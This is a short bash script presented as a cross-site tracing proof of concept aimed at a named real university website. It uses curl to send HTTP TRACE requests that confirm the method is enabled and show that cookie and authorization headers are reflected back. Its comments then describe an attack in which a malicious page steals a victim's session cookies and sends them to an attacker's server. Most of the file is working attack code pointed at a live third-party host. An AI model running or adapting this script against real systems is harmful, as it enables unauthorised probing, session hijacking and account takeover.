#!/bin/bash
# XST Cookie Theft POC via TRACE Method
# Target: www.ou.edu (Apache 2.4.6)

TARGET="https://www.ou.edu"
echo "=== XST POC ==="
echo "Target: $TARGET"
echo ""

# Step 1: Confirm TRACE enabled
echo "[1] Confirming TRACE method..."
TRACE_RESPONSE=$(curl -sk -m 10 -X TRACE "$TARGET/" -D - 2>/dev/null)
if echo "$TRACE_RESPONSE" | grep -q "200 OK"; then
    echo "  TRACE method: ENABLED"
else
    echo "  TRACE method: BLOCKED"
    exit 1
fi

# Step 2: Demonstrate header reflection
echo ""
echo "[2] Demonstrating header reflection..."
curl -sk -m 10 -X TRACE "$TARGET/" \
    -H "Cookie: session=STOLEN_TOKEN_12345" \
    -H "Authorization: Bearer stolen_bearer_token" \
    2>/dev/null | grep -i "cookie\|authorization"

# Step 3: Create malicious page
echo ""
echo "[3] Attack scenario:"
echo "  Attacker hosts page with JavaScript that sends TRACE request"
echo "  Victim visits attacker page while authenticated to $TARGET"
echo "  TRACE response contains victim's cookies in reflected headers"
echo "  Attacker exfiltrates cookies to their server"
echo ""
echo "  Impact: Session hijacking, account takeover"
